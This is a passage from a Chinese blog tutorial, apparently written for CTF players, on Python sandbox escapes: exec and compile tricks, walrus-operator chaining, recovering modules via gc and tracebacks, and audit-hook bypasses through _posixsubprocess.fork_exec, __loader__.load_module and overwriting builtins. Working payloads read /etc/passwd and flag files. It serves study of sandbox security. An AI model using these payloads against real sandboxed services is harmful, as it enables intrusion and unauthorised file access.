class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h4 id="exec"><a class="markdownIt-Anchor" href="#exec">#</a> exec</h4><p>exec 可以支持换行符与 <code>;</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div><h4 id="compile"><a class="markdownIt-Anchor" href="#compile">#</a> compile</h4><p>compile 在 single 模式下也同样可以使用 \n 进行换行，在 exec 模式下可以直接执行多行代码.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="海象表达式"><a class="markdownIt-Anchor" href="#海象表达式">#</a> 海象表达式</h4><p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p><p>海象表达式的语法形式如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; := &lt;value&gt; <span class="keyword">if</span> &lt;condition&gt; <span class="keyword">else</span> &lt;value&gt;</span><br></pre></td></tr></table></figure></div><p>借助海象表达式，我们可以通过列表来替代多行代码：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br><span class="line">uid=<span class="number">1000</span>(kali) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">20</span>(dialout),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">27</span>(sudo),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">109</span>(netdev),<span class="number">119</span>(wireshark),<span class="number">122</span>(bluetooth),<span class="number">134</span>(scanner),<span class="number">142</span>(kaboxer)</span><br><span class="line">[&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;, <span class="number">0</span>]</span><br></pre></td></tr></table></figure></div><h3 id="变量覆盖与函数篡改"><a class="markdownIt-Anchor" href="#变量覆盖与函数篡改">#</a> 变量覆盖与函数篡改</h3><p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p><p>sys.modules 存放了现有模块的引用，通过访问  <code>sys.modules['__main__']</code>  就可以访问当当前模块定义的所有函数以及全局变量</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aaa = <span class="string">&#x27;bbb&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line"><span class="meta">... </span>    dict_global = <span class="built_in">dict</span>()</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>()</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">break</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>])</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;my_input&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>].aaa</span><br><span class="line"><span class="string">&#x27;bbb&#x27;</span></span><br></pre></td></tr></table></figure></div><p>除了通过 sys 模块来获取当前模块的变量以及函数外，还可以通过  <code>__builtins__</code> 篡改内置函数等，这只是一个思路.</p><p>总体来说，只要获取了某个函数或者变量就可以篡改，难点就在于获取.</p><h4 id="利用-gc-获取已删除模块"><a class="markdownIt-Anchor" href="#利用-gc-获取已删除模块">#</a> 利用 gc 获取已删除模块</h4><p>这个思路来源于 <a class="link" href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>这道题的目标是覆盖  <code>__main__</code>  中的  <code>__exit</code>  函数，但是题目将  <code>sys.modules['__main__']</code>  删除了，无法直接获取.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure></div><p><code>gc</code>  是 Python 的内置模块，全名为 &quot;garbage collector&quot;，中文译为 &quot;垃圾回收&quot;。 <code>gc</code>  模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p><p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。 <code>gc</code>  模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p><p>下面是一些  <code>gc</code>  模块中的主要函数：</p><ol><li><code>gc.collect(generation=2)</code> ：这个函数会立即触发一次垃圾回收。你可以通过  <code>generation</code>  参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li><li><code>gc.get_objects()</code> ：这个函数会返回当前被管理的所有对象的列表。</li><li><code>gc.get_referrers(*objs)</code> ：这个函数会返回指向  <code>objs</code>  中任何一个对象的对象列表。</li></ol><p>exp 如下</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">in</span> obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module __main__&#x27;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> == obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module os&#x27;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&quot;[+] bypass&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p><h4 id="利用-traceback-获取模块"><a class="markdownIt-Anchor" href="#利用-traceback-获取模块">#</a> 利用 traceback 获取模块</h4><p>这个思路来源于 <a class="link" href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks – github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>主动抛出异常，并获取其后要执行的代码，然后将 <code>__exit</code>  进行替换，思路也是十分巧妙.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line">    <span class="comment"># has a reference to the audit function</span></span><br><span class="line">    <span class="keyword">while</span> nxt_frame:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Neuter the __exit function</span></span><br><span class="line">    nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">    os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>但是实际测试时使用 python 3.11 发现  <code>nxt_frame = tb.tb_frame</code>  会触发  <code>object.__getattr__</code>  hook. 不同的版本中触发 hook 的地方会有差异，这个 payload 可能仅在 python 3.9 (题目版本) 中适用</p><h3 id="绕过-audit-hook"><a class="markdownIt-Anchor" href="#绕过-audit-hook">#</a> 绕过 audit hook</h3><p>Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。</p><p>Python 中的审计事件包括但不限于以下几类：</p><ul><li><code>import</code> ：发生在导入模块时。</li><li><code>open</code> ：发生在打开文件时。</li><li><code>write</code> ：发生在写入文件时。</li><li><code>exec</code> ：发生在执行 Python 代码时。</li><li><code>compile</code> ：发生在编译 Python 代码时。</li><li><code>socket</code> ：发生在创建或使用网络套接字时。</li><li><code>os.system</code> ， <code>os.popen</code>  等：发生在执行操作系统命令时。</li><li><code>subprocess.Popen</code> ， <code>subprocess.run</code>  等：发生在启动子进程时。</li></ul><p>calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱，采用白名单来进行限制.audit hook 属于 python 底层的实现，因此常规的变换根本无法绕过.</p><p>这道题需要绕过的点有两个:</p><ol><li><p>绕过 import 导入模块。如果直接使用 import, 就会触发 audithook</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; __import__(&#x27;ctypes&#x27;)</span><br><span class="line"> Operation not permitted: import</span><br></pre></td></tr></table></figure></div></li><li><p>绕过常规的命令执行方法执行命令。利用 os, subproccess 等模块执行命令时也会触发 audithook</p></li></ol><p>在上文利用 <code>_posixsubprocess.fork.exec</code>  绕过之外：</p><h4 id="_posixsubprocess-执行命令"><a class="markdownIt-Anchor" href="#_posixsubprocess-执行命令">#</a> _posixsubprocess 执行命令</h4><p>_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.</p><p>该模块的核心功能是 fork_exec 函数，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出，每个版本的 Python 可能有所差异.</p><p>在我本地的 Python 3.11 中具体的函数声明如下:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br></pre></td></tr></table></figure></div><ul><li><code>__process_args</code> : 传递给新进程的命令行参数，通常为程序路径及其参数的列表。</li><li><code>__executable_list</code> : 可执行程序路径的列表。</li><li><code>__close_fds</code> : 如果设置为 True，则在新进程中关闭所有的文件描述符。</li><li><code>__fds_to_keep</code> : 一个元组，表示在新进程中需要保持打开的文件描述符的列表。</li><li><code>__cwd_obj</code> : 新进程的工作目录。</li><li><code>__env_list</code> : 环境变量列表，它是键和值的序列，例如：[“PATH=/usr/bin”, “HOME=/home/user”]。</li><li><code>__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite</code> : 这些是文件描述符，用于在父子进程间进行通信。</li><li><code>__errpipe_read, __errpipe_write</code> : 这两个文件描述符用于父子进程间的错误通信。</li><li><code>__restore_signals</code> : 如果设置为 1，则在新创建的子进程中恢复默认的信号处理。</li><li><code>__call_setsid</code> : 如果设置为 1，则在新进程中创建新的会话。</li><li><code>__pgid_to_set</code> : 设置新进程的进程组 ID。</li><li><code>__gid_object, __groups_list, __uid_object</code> : 这些参数用于设置新进程的用户 ID 和组 ID。</li><li><code>__child_umask</code> : 设置新进程的 umask。</li><li><code>__preexec_fn</code> : 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。</li><li><code>__allow_vfork</code> : 如果设置为 True，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。</li></ul><p>下面是一个最小化示例:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>结合上面的  <code>__loader__.load_module(fullname)</code>  可以得到最终的 payload:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>可以看到全程触发了  <code>builtins.input/result</code> , compile, exec 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的， <code>__loader__.load_module</code>  和  <code>_posixsubprocess</code>  都没有触发.</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] builtins.input/result, (&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;,)</span><br><span class="line">[+] compile, (b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;, &#x27;&lt;string&gt;&#x27;)</span><br><span class="line">[+] exec, (&lt;code object &lt;module&gt; at 0x7fbecc924670, file &quot;&lt;string&gt;&quot;, line 1&gt;,)</span><br></pre></td></tr></table></figure></div><h4 id="__loader__load_module-导入模块"><a class="markdownIt-Anchor" href="#__loader__load_module-导入模块">#</a>  <code>__loader__.load_module</code>  导入模块</h4><p><code>__loader__.load_module(fullname)</code>  也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><code>__loader__</code>  实际上指向的是  <code>_frozen_importlib.BuiltinImporter</code>  类，也可以通过别的方式进行获取</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ().__class__.__base__.__subclasses__()[84]</span></span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __loader__</span></span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ().__class__.__base__.__subclasses__()[84].__name__</span></span><br><span class="line">&#x27;BuiltinImporter&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; [x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][0]</span></span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br></pre></td></tr></table></figure></div><p><code>__loader__.load_module</code>  也有一个缺点就是<strong>无法导入非内建模块</strong>， 例如 socket</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 290, in _load_module_shim</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 721, in _load</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 676, in _load_unlocked</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 573, in module_from_spec</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 776, in create_module</span><br><span class="line">ImportError: &#x27;socket&#x27; is not a built-in module</span><br></pre></td></tr></table></figure></div><h4 id="篡改内置函数"><a class="markdownIt-Anchor" href="#篡改内置函数">#</a> 篡改内置函数</h4><p>这道 audit hook 题还有一个解法，可以看到 WHITE_EVENT 是通过 set 函数返回的，set 函数作为一个内置函数实际上也是可以被修改的</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></div><p>比如我们将 set 函数修改为固定返回一个包含了 os.system 函数的列表</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>这样 set 函数会固定返回带有 os.system 的列表.</p><p>最终 payload:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;)</span><br><span class="line"></span><br><span class="line"># 篡改函数</span><br><span class="line">exec(&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag2.txt&#x27;)&quot;)</span><br></pre></td></tr></table></figure></div><h4 id="其他不触发-hook-的方式"><a class="markdownIt-Anchor" href="#其他不触发-hook-的方式">#</a> 其他不触发 hook 的方式</h4><p>使用  <code>__loader__.load_module('os')</code>  是为了获取 os 模块，其实在 no builtins 利用手法中，无需导入也可以获取对应模块。例如:</p><h3 id="绕过-ast-沙箱"><a class="markdownIt-Anchor" href="#绕过-ast-沙箱">#</a> 绕过 AST 沙箱</h3><p>Python 的 ast 模块是一个用于处理 Python 代码抽象语法树（AST）的库。它提供了一些工具，可以让开发者轻松地检查、修改和生成 Python 代码的 AST。</p><p>抽象语法树是 Python 源代码的一种树形表示形式，用于表示 Python 代码的语法结构。Python 的 ast 模块可以将 Python 代码解析为 AST，并提供了许多方法和属性，以便开发者可以访问和修改 AST 节点。</p><p>以下是 ast 模块中常用的一些类和方法：</p><ol><li>ast.parse(source, filename=’<string>’, mode=‘exec’)：将源代码解析为 AST 对象。</string></li><li>ast.dump (node)：将 AST 节点转换为字符串形式输出。</li><li>ast.NodeVisitor：一个基类，可以用于遍历和修改 AST 树。</li><li>ast.NodeTransformer：一个基类，可以用于修改 AST 节点。</li><li>ast.Module：表示 Python 模块。</li><li>ast.FunctionDef：表示 Python 